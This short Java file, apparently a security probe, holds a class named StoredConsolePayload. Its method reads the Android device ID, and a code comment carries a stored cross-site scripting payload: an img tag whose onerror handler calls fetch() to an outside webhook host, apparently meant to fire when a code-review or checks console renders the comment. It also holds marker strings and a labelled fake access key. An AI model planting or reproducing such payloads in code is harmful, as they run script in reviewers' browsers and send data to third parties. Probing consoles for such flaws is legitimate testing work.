class StoredConsolePayload {
  void leak(android.content.ContentResolver cr) {
    String androidId = Settings.Secure.getString(cr, Settings.Secure.ANDROID_ID);
    /* S1_CONSOLE_XSS_20260526 <img src=x onerror=fetch('https://webhooksite.net/0526b795-8a2c-495b-a6ca-3c7d494aa00c?surface=checks-console&marker=S1_CONSOLE_XSS_20260526')> */
    String marker = "S1_PR_ARBITRARY_CONTENT_MARKER_20260526";
    String fakeKey = "AKIA_TEST_ONLY_NOT_A_SECRET_20260526";
  }
}
